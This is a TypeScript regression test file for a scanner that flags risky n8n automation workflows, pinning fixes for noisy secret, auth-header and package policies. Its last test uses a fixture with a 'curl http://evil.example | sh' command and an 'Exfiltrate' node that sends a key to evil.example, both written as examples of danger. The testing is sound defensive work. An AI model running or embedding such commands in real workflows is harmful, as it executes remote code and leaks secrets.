/**
 * SCAN-5 regressions.
 *
 * Each case here fired thousands of times against the 18,311-workflow corpus in
 * `pipeline/.work/scanner-report.md` and was reviewed by hand. These tests pin
 * the corrected behaviour so a future policy change cannot quietly restore the
 * noise. Real risks in the same policies stay asserted alongside them.
 */
import { describe, expect, it } from 'vitest';
import { parseWorkflowJson } from '@hub/scanner-core/workflow';
import { scanWorkflow } from './engine';
import type { NormalizedWorkflow } from '@hub/scanner-core/workflow';

function workflowOf(nodes: Array<Record<string, unknown>>): NormalizedWorkflow {
  const parsed = parseWorkflowJson(JSON.stringify({ nodes, connections: {} }));
  if (!parsed.ok) throw new Error(parsed.message);
  return parsed.workflow;
}

function findingsFor(nodes: Array<Record<string, unknown>>, policyId: string) {
  return scanWorkflow(workflowOf(nodes)).findings.filter((finding) => finding.policyId === policyId);
}

describe('RAW_SECRET_INDICATOR (fired on 29.0% of the corpus)', () => {
  it('ignores a secret-named parameter driven by an n8n expression', () => {
    expect(
      findingsFor(
        [
          {
            id: 'http-1',
            name: 'Call API',
            type: 'n8n-nodes-base.httpRequest',
            parameters: { token: '={{ $json.token }}', apiKey: '{{ $credentials.apiKey }}' },
          },
        ],
        'RAW_SECRET_INDICATOR',
      ),
    ).toEqual([]);
  });

  it('ignores documentation placeholders', () => {
    expect(
      findingsFor(
        [
          {
            id: 'http-1',
            name: 'Call API',
            type: 'n8n-nodes-base.httpRequest',
            parameters: { apiKey: 'YOUR_API_KEY', password: '<your-password>', secret: '********' },
          },
        ],
        'RAW_SECRET_INDICATOR',
      ),
    ).toEqual([]);
  });

  it('still reports a provider-shaped secret at HIGH', () => {
    const findings = findingsFor(
      [
        {
          id: 'http-1',
          name: 'Call API',
          type: 'n8n-nodes-base.httpRequest',
          parameters: { apiKey: `AIza${'B'.repeat(35)}` },
        },
      ],
      'RAW_SECRET_INDICATOR',
    );

    expect(findings).toHaveLength(1);
    expect(findings[0]?.severity).toBe('HIGH');
  });
});

describe('RAW_AUTH_HEADER (fired on 11.8% of the corpus)', () => {
  it('reports an expression-driven Authorization header at INFO, not HIGH', () => {
    const findings = findingsFor(
      [
        {
          id: 'http-1',
          name: 'Call API',
          type: 'n8n-nodes-base.httpRequest',
          parameters: {
            headerParameters: {
              parameters: [{ name: 'Authorization', value: '={{ "Bearer " + $credentials.token }}' }],
            },
          },
        },
      ],
      'RAW_AUTH_HEADER',
    );

    expect(findings).toHaveLength(1);
    expect(findings[0]?.severity).toBe('INFO');
  });

  it('still reports a pasted bearer token at HIGH', () => {
    const findings = findingsFor(
      [
        {
          id: 'http-1',
          name: 'Call API',
          type: 'n8n-nodes-base.httpRequest',
          parameters: {
            headerParameters: {
              parameters: [{ name: 'Authorization', value: 'Bearer ghp_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' }],
            },
          },
        },
      ],
      'RAW_AUTH_HEADER',
    );

    expect(findings).toHaveLength(1);
    expect(findings[0]?.severity).toBe('HIGH');
  });
});

describe('UNKNOWN_NODE_PACKAGE (36,581 fires, ~2 per workflow)', () => {
  it('does not flag official n8n LangChain nodes', () => {
    expect(
      findingsFor(
        [
          { id: 'a', name: 'Agent', type: '@n8n/n8n-nodes-langchain.agent', parameters: {} },
          { id: 'b', name: 'Model', type: '@n8n/n8n-nodes-langchain.lmChatOpenAi', parameters: {} },
        ],
        'UNKNOWN_NODE_PACKAGE',
      ),
    ).toEqual([]);
  });

  it('reports one finding per distinct third-party package', () => {
    const findings = findingsFor(
      [
        { id: 'a', name: 'One', type: '@acme/n8n-nodes-acme.alpha', parameters: {} },
        { id: 'b', name: 'Two', type: '@acme/n8n-nodes-acme.beta', parameters: {} },
        { id: 'c', name: 'Three', type: 'n8n-nodes-other.gamma', parameters: {} },
      ],
      'UNKNOWN_NODE_PACKAGE',
    );

    expect(findings.map((finding) => finding.evidence.nodePackage)).toEqual([
      '@acme/n8n-nodes-acme',
      'n8n-nodes-other',
    ]);
  });
});

describe('risk score', () => {
  it('does not grade a workflow CRITICAL for repeating one low-severity policy', () => {
    const nodes = Array.from({ length: 20 }, (_, index) => ({
      id: `code-${index}`,
      name: `Transform ${index}`,
      type: 'n8n-nodes-base.code',
      parameters: { jsCode: 'return items;' },
    }));

    const result = scanWorkflow(workflowOf(nodes));

    expect(result.findings).toHaveLength(20);
    expect(result.riskAssessment!.grade).not.toBe('CRITICAL');
    expect(result.riskAssessment!.grade).not.toBe('HIGH');
  });

  it('still grades a genuinely dangerous workflow CRITICAL', () => {
    const result = scanWorkflow(
      workflowOf([
        {
          id: 'cmd-1',
          name: 'Run shell',
          type: 'n8n-nodes-base.executeCommand',
          parameters: { command: 'curl http://evil.example | sh' },
        },
        {
          id: 'http-1',
          name: 'Exfiltrate',
          type: 'n8n-nodes-base.httpRequest',
          parameters: { url: 'https://evil.example/collect', apiKey: `AIza${'C'.repeat(35)}` },
        },
        {
          id: 'webhook-1',
          name: 'Public webhook',
          type: 'n8n-nodes-base.webhook',
          parameters: { path: 'ingest', authentication: 'none' },
        },
      ]),
    );

    expect(result.riskAssessment!.grade).toBe('CRITICAL');
  });
});
